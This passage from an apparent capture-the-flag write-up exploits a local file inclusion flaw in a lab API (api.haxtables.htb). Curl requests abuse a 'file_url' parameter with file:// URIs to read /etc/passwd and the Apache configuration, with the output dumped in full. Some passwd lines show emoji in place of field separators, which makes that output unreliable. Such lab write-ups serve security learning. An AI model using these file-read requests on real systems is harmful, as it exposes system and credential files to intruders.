</span></span><span class=line><span class=cl><span class=o>{</span><span class=s2>&#34;data&#34;</span>:<span class=s2>&#34;PCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJlbiI+DQo8aGVhZD4NCiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+DQogICAgPG1ldGEgaHR0cC1lcXVpdj0iWC1VQS1Db21wYXRpYmxlIiBjb250ZW50PSJJRT1lZGdlIj4NCiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+DQogICAgPHRpdGxlPkhheFRhYmxlczwvdGl0bGU+DQogICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPg0KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSI+DQogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL21heGNkbi5ib290c3RyYXBjZG4uY29tL2Jvb3RzdHJhcC8zLjQuMS9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiPg0KICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2FqYXguZ29vZ2xlYXBpcy5jb20vYWpheC9saWJzL2pxdWVyeS8zLjYuMC9qcXVlcnkubWluLmpzIj48L3NjcmlwdD4NCiAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9tYXhjZG4uYm9vdHN0cmFwY2RuLmNvbS9ib290c3RyYXAvMy40LjEvanMvYm9vdHN0cmFwLm1pbi5qcyI+PC9zY3JpcHQ+DQogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJhc3NldHMvY3NzL21haW4uY3NzIj4NCiAgICA8c2NyaXB0IHNyYz0iLi9hc3NldHMvanMvbWFpbi5qcyI+PC9zY3JpcHQ+DQoNCjwvaGVhZD4NCjxib2R5Pg0KPGgxIGFsaWduPSJjZW50ZXIiPkhheFRhYmxlczwvaDE+DQo8YnI+PGJyPg0KPGRpdiBjbGFzcz0iY29udGFpbmVyIj4NCjxuYXYgY2xhc3M9Im5hdmJhciBuYXZiYXItaW52ZXJzZSI+DQogIDxkaXYgY2xhc3M9ImNvbnRhaW5lci1mbHVpZCI+DQogICAgPGRpdiBjbGFzcz0ibmF2YmFyLWhlYWRlciI+DQogICAgICA8YSBjbGFzcz0ibmF2YmFyLWJyYW5kIiBocmVmPSIvIj5IYXhUYWJsZXM8L2E+DQogICAgPC9kaXY+DQogICAgPHVsIGNsYXNzPSJuYXYgbmF2YmFyLW5hdiI+DQogICAgICA8bGkgY2xhc3M9ImFjdGl2ZSI+PGEgaHJlZj0iLyI+SG9tZTwvYT48L2xpPg0KICAgICAgPGxpIGNsYXNzPSJkcm9wZG93biI+PGEgY2xhc3M9ImRyb3Bkb3duLXRvZ2dsZSIgZGF0YS10b2dnbGU9ImRyb3Bkb3duIiBocmVmPSIjIj5Db252ZXJ0aW9uczxzcGFuIGNsYXNzPSJjYXJldCI+PC9zcGFuPjwvYT4NCiAgICAgICAgPHVsIGNsYXNzPSJkcm9wZG93bi1tZW51Ij4NCiAgICAgICAgICA8bGk+PGEgaHJlZj0iL2luZGV4LnBocD9wYWdlPXN0cmluZyI+U3RyaW5nPC9hPjwvbGk+DQogICAgICAgICAgPGxpPjxhIGhyZWY9Ii9pbmRleC5waHA\/cGFnZT1pbnRlZ2VyIj5JbnRlZ2VyPC9hPjwvbGk+DQogICAgICAgICAgPGxpPjxhIGhyZWY9Ii9pbmRleC5waHA\/cGFnZT1pbWFnZSI+SW1hZ2VzPC9hPjwvbGk+DQogICAgICAgIDwvdWw+DQogICAgICA8L2xpPg0KICAgICAgPGxpPjxhIGhyZWY9IiMiPkFib3V0IHVzPC9hPjwvbGk+DQogICAgICA8bGk+PGEgaHJlZj0iL2luZGV4LnBocD9wYWdlPWFwaSI+QVBJPC9hPjwvbGk+DQogICAgPC91bD4NCiAgPC9kaXY+DQo8L25hdj4NCg0KPHAgYWxpZ249ImNlbnRlciI+RnJlZSBvbmxpbmUgU3RyaW5nIGFuZCBOdW1iZXIgY29udmVydGVyLiBKdXN0IGxvYWQgeW91ciBpbnB1dCAgYW5kIHRoZXkgd2lsbCBhdXRvbWF0aWNhbGx5IGdldCBjb252ZXJ0ZWQgdG8gc2VsZWN0ZWQgZm9ybWF0LiAgQSBjb2xsZWN0aW9uIG9mIHVzZWZ1bCB1dGlsaXRpZXMgZm9yIHdvcmtpbmcgd2l0aCBTdHJpbmcgYW5kIEludGVnZXIgdmFsdWVzLiBBbGwgYXJlIHNpbXBsZSwgZnJlZSBhbmQgZWFzeSB0byB1c2UuIFRoZXJlIGFyZSBubyBhZHMsIHBvcHVwcyBvciBvdGhlciBnYXJiYWdlITwvcD4NCg0KPHAgYWxpZ249ImNlbnRlciI+DQogICAgPGltZyAgc3JjPSIuLi9hc3NldHMvaW1nL2luZGV4LnBuZyI+DQo8L3A+DQo8L2Rpdj4NCjwvYm9keT4NCjwvaHRtbD4NCg==&#34;</span><span class=o>}</span>%            
</span></span></code></pre></td></tr></table></div></div><p>I read around on PHP based Local file Inclusion, and found the <code>file://</code> URI works:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> <span class=s2>&#34;http://api.haxtables.htb/v3/tools/string/index.php&#34;</span> -H <span class=s2>&#34;Content-Type: application/json&#34;</span> -d <span class=s1>&#39;{&#34;action&#34;: &#34;b64encode&#34;, &#34;file_url&#34;: &#34;file:///etc/passwd&#34;}&#39;</span> <span class=p>|</span> jq -r .data <span class=p>|</span> base64 -d
</span></span><span class=line><span class=cl>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span><span class=line><span class=cl>                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span class=line><span class=cl><span class=m>100</span>  <span class=m>2564</span>    <span class=m>0</span>  <span class=m>2507</span>  <span class=m>100</span>    <span class=m>57</span>  <span class=m>57113</span>   <span class=m>1298</span> --:--:-- --:--:-- --:--:-- <span class=m>59627</span>
</span></span><span class=line><span class=cl>root❌0:0:root:/root:/bin/bash
</span></span><span class=line><span class=cl>daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span class=line><span class=cl>bin❌2:2:bin:/bin:/usr/sbin/nologin
</span></span><span class=line><span class=cl>sys❌3:3:sys:/dev:/usr/sbin/nologin
</span></span><span class=line><span class=cl>sync❌4:65534:sync:/bin:/bin/sync
</span></span><span class=line><span class=cl>games❌5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span class=line><span class=cl>man❌6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span class=line><span class=cl>lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>mail❌8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span class=line><span class=cl>news❌9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span class=line><span class=cl>uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span class=line><span class=cl>proxy❌13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span class=line><span class=cl>www-data❌33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span class=line><span class=cl>backup❌34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span class=line><span class=cl>list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span class=line><span class=cl>irc❌39:39:ircd:/run/ircd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>gnats❌41:41:Gnats Bug-Reporting System <span class=o>(</span>admin<span class=o>)</span>:/var/lib/gnats:/usr/sbin/nologin
</span></span><span class=line><span class=cl>nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span class=line><span class=cl>_apt❌100:65534::/nonexistent:/usr/sbin/nologin
</span></span><span class=line><span class=cl>systemd-network❌101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>systemd-resolve❌102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>messagebus❌103:104::/nonexistent:/usr/sbin/nologin
</span></span><span class=line><span class=cl>systemd-timesync❌104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>pollinate❌105:1::/var/cache/pollinate:/bin/false
</span></span><span class=line><span class=cl>sshd❌106:65534::/run/sshd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>syslog❌107:113::/home/syslog:/usr/sbin/nologin
</span></span><span class=line><span class=cl>uuidd❌108:114::/run/uuidd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>tcpdump❌109:115::/nonexistent:/usr/sbin/nologin
</span></span><span class=line><span class=cl>tss❌110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
</span></span><span class=line><span class=cl>landscape❌111:117::/var/lib/landscape:/usr/sbin/nologin
</span></span><span class=line><span class=cl>usbmux❌112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</span></span><span class=line><span class=cl>svc❌1000:1000:svc:/home/svc:/bin/bash
</span></span><span class=line><span class=cl>lxd❌999💯:/var/snap/lxd/common/lxd:/bin/false
</span></span><span class=line><span class=cl>fwupd-refresh❌113:120:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
</span></span><span class=line><span class=cl>_laurel❌998:998::/var/log/laurel:/bin/false
</span></span></code></pre></td></tr></table></div></div><p>The one interesting user here, apart from root:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>svc❌1000:1000:svc:/home/svc:/bin/bash
</span></span></code></pre></td></tr></table></div></div><p>We know the server is Apache 2.4.52 running on Ubuntu, so with this in mind, I searched around for Apache log paths on Ubuntu. After trying different locations for logs and configuration, I found the root config at <code>/etc/apache2/apache2.conf</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> <span class=s2>&#34;http://api.haxtables.htb/v3/tools/string/index.php&#34;</span> -H <span class=s2>&#34;Content-Type: application/json&#34;</span> -d <span class=s1>&#39;{&#34;action&#34;: &#34;b64encode&#34;, &#34;file_url&#34;: &#34;file:///etc/apache2/apache2.conf&#34;}&#39;</span> <span class=p>|</span> jq -r .data <span class=p>|</span> base64 -d
</span></span><span class=line><span class=cl>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span><span class=line><span class=cl>                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span class=line><span class=cl><span class=m>100</span>  <span class=m>9746</span>    <span class=m>0</span>  <span class=m>9675</span>  <span class=m>100</span>    <span class=m>71</span>   210k   <span class=m>1581</span> --:--:-- --:--:-- --:--:--  216k
</span></span><span class=line><span class=cl><span class=c1># This is the main Apache server configuration file.  It contains the</span>
</span></span><span class=line><span class=cl><span class=c1># configuration directives that give the server its instructions.</span>
</span></span><span class=line><span class=cl><span class=c1># See http://httpd.apache.org/docs/2.4/ for detailed information about</span>
</span></span><span class=line><span class=cl><span class=c1># the directives and /usr/share/doc/apache2/README.Debian about Debian specific</span>
</span></span><span class=line><span class=cl><span class=c1># hints.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Summary of how the Apache 2 configuration works in Debian:</span>
</span></span><span class=line><span class=cl><span class=c1># The Apache 2 web server configuration in Debian is quite different to</span>
</span></span><span class=line><span class=cl><span class=c1># upstream&#39;s suggested way to configure the web server. This is because Debian&#39;s</span>
</span></span><span class=line><span class=cl><span class=c1># default Apache2 installation attempts to make adding and removing modules,</span>
</span></span><span class=line><span class=cl><span class=c1># virtual hosts, and extra configuration directives as flexible as possible, in</span>
</span></span><span class=line><span class=cl><span class=c1># order to make automating the changes and administering the server as easy as</span>
</span></span><span class=line><span class=cl><span class=c1># possible.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># It is split into several files forming the configuration hierarchy outlined</span>
</span></span><span class=line><span class=cl><span class=c1># below, all located in the /etc/apache2/ directory:</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#    /etc/apache2/</span>
</span></span><span class=line><span class=cl><span class=c1>#    |-- apache2.conf</span>
</span></span><span class=line><span class=cl><span class=c1>#    |    `--  ports.conf</span>
</span></span><span class=line><span class=cl><span class=c1>#    |-- mods-enabled</span>
</span></span><span class=line><span class=cl><span class=c1>#    |    |-- *.load</span>
</span></span><span class=line><span class=cl><span class=c1>#    |    `-- *.conf</span>
</span></span><span class=line><span class=cl><span class=c1>#    |-- conf-enabled</span>
</span></span><span class=line><span class=cl><span class=c1>#    |    `-- *.conf</span>
</span></span><span class=line><span class=cl><span class=c1>#     `-- sites-enabled</span>
</span></span><span class=line><span class=cl><span class=c1>#         `-- *.conf</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># * apache2.conf is the main configuration file (this file). It puts the pieces</span>
</span></span><span class=line><span class=cl><span class=c1>#   together by including all remaining configuration files when starting up the</span>
</span></span><span class=line><span class=cl><span class=c1>#   web server.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># * ports.conf is always included from the main configuration file. It is</span>
</span></span><span class=line><span class=cl><span class=c1>#   supposed to determine listening ports for incoming connections which can be</span>
</span></span><span class=line><span class=cl><span class=c1>#   customized anytime.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># * Configuration files in the mods-enabled/, conf-enabled/ and sites-enabled/</span>
</span></span><span class=line><span class=cl><span class=c1>#   directories contain particular configuration snippets which manage modules,</span>
</span></span><span class=line><span class=cl><span class=c1>#   global configuration fragments, or virtual host configurations,</span>
</span></span><span class=line><span class=cl><span class=c1>#   respectively.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#   They are activated by symlinking available configuration files from their</span>
</span></span><span class=line><span class=cl><span class=c1>#   respective *-available/ counterparts. These should be managed by using our</span>
</span></span><span class=line><span class=cl><span class=c1>#   helpers a2enmod/a2dismod, a2ensite/a2dissite and a2enconf/a2disconf. See</span>
</span></span><span class=line><span class=cl><span class=c1>#   their respective man pages for detailed information.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># * The binary is called apache2. Due to the use of environment variables, in</span>
</span></span><span class=line><span class=cl><span class=c1>#   the default configuration, apache2 needs to be started/stopped with</span>
</span></span><span class=line><span class=cl><span class=c1>#   /etc/init.d/apache2 or apache2ctl. Calling /usr/bin/apache2 directly will not</span>
</span></span><span class=line><span class=cl><span class=c1>#   work with the default configuration.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Global configuration</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># ServerRoot: The top of the directory tree under which the server&#39;s</span>
</span></span><span class=line><span class=cl><span class=c1># configuration, error, and log files are kept.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># NOTE!  If you intend to place this on an NFS (or otherwise network)</span>
</span></span><span class=line><span class=cl><span class=c1># mounted filesystem then please read the Mutex documentation (available</span>
</span></span><span class=line><span class=cl><span class=c1># at &lt;URL:http://httpd.apache.org/docs/2.4/mod/core.html#mutex&gt;);</span>
</span></span><span class=line><span class=cl><span class=c1># you will save yourself a lot of trouble.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Do NOT add a slash at the end of the directory path.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#ServerRoot &#34;/etc/apache2&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># The accept serialization lock file MUST BE STORED ON A LOCAL DISK.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#Mutex file:${APACHE_LOCK_DIR} default</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># The directory where shm and other runtime files will be stored.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>DefaultRuntimeDir <span class=si>${</span><span class=nv>APACHE_RUN_DIR</span><span class=si>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># PidFile: The file in which the server should record its process</span>
</span></span><span class=line><span class=cl><span class=c1># identification number when it starts.</span>
</span></span><span class=line><span class=cl><span class=c1># This needs to be set in /etc/apache2/envvars</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl>PidFile <span class=si>${</span><span class=nv>APACHE_PID_FILE</span><span class=si>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Timeout: The number of seconds before receives and sends time out.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl>Timeout <span class=m>300</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># KeepAlive: Whether or not to allow persistent connections (more than</span>
</span></span><span class=line><span class=cl><span class=c1># one request per connection). Set to &#34;Off&#34; to deactivate.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl>KeepAlive On
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># MaxKeepAliveRequests: The maximum number of requests to allow</span>
</span></span><span class=line><span class=cl><span class=c1># during a persistent connection. Set to 0 to allow an unlimited amount.</span>
</span></span><span class=line><span class=cl><span class=c1># We recommend you leave this number high, for maximum performance.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl>MaxKeepAliveRequests <span class=m>100</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># KeepAliveTimeout: Number of seconds to wait for the next request from the</span>
</span></span><span class=line><span class=cl><span class=c1># same client on the same connection.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl>KeepAliveTimeout <span class=m>5</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># These need to be set in /etc/apache2/envvars</span>
</span></span><span class=line><span class=cl>User <span class=si>${</span><span class=nv>APACHE_RUN_USER</span><span class=si>}</span>
</span></span><span class=line><span class=cl>Group <span class=si>${</span><span class=nv>APACHE_RUN_GROUP</span><span class=si>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># HostnameLookups: Log the names of clients or just their IP addresses</span>
</span></span><span class=line><span class=cl><span class=c1># e.g., www.apache.org (on) or 204.62.129.132 (off).</span>
</span></span><span class=line><span class=cl><span class=c1># The default is off because it&#39;d be overall better for the net if people</span>
</span></span><span class=line><span class=cl><span class=c1># had to knowingly turn this feature on, since enabling it means that</span>
</span></span><span class=line><span class=cl><span class=c1># each client request will result in AT LEAST one lookup request to the</span>
</span></span><span class=line><span class=cl><span class=c1># nameserver.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl>HostnameLookups Off
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ErrorLog: The location of the error log file.</span>
</span></span><span class=line><span class=cl><span class=c1># If you do not specify an ErrorLog directive within a &lt;VirtualHost&gt;</span>
</span></span><span class=line><span class=cl><span class=c1># container, error messages relating to that virtual host will be</span>
</span></span><span class=line><span class=cl><span class=c1># logged here.  If you *do* define an error logfile for a &lt;VirtualHost&gt;</span>
</span></span><span class=line><span class=cl><span class=c1># container, that host&#39;s errors will be logged there and not here.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl>ErrorLog <span class=si>${</span><span class=nv>APACHE_LOG_DIR</span><span class=si>}</span>/error.log
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># LogLevel: Control the severity of messages logged to the error_log.</span>
</span></span><span class=line><span class=cl><span class=c1># Available values: trace8, ..., trace1, debug, info, notice, warn,</span>
</span></span><span class=line><span class=cl><span class=c1># error, crit, alert, emerg.</span>
</span></span><span class=line><span class=cl><span class=c1># It is also possible to configure the log level for particular modules, e.g.</span>
</span></span><span class=line><span class=cl><span class=c1># &#34;LogLevel info ssl:warn&#34;</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl>LogLevel warn
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Include module configuration:</span>
</span></span><span class=line><span class=cl>IncludeOptional mods-enabled/*.load
</span></span><span class=line><span class=cl>IncludeOptional mods-enabled/*.conf
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Include list of ports to listen on</span>
</span></span><span class=line><span class=cl>Include ports.conf
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Sets the default security model of the Apache2 HTTPD server. It does</span>
</span></span><span class=line><span class=cl><span class=c1># not allow access to the root filesystem outside of /usr/share and /var/www.</span>
</span></span><span class=line><span class=cl><span class=c1># The former is used by web applications packaged in Debian,</span>
</span></span><span class=line><span class=cl><span class=c1># the latter may be used for local directories served by the web server. If</span>
</span></span><span class=line><span class=cl><span class=c1># your system is serving content from a sub-directory in /srv you must allow</span>
</span></span><span class=line><span class=cl><span class=c1># access here, or in any related virtual host.</span>
</span></span><span class=line><span class=cl>&lt;Directory /&gt;
</span></span><span class=line><span class=cl>    Options FollowSymLinks
</span></span><span class=line><span class=cl>    AllowOverride None
</span></span><span class=line><span class=cl>    Require all denied
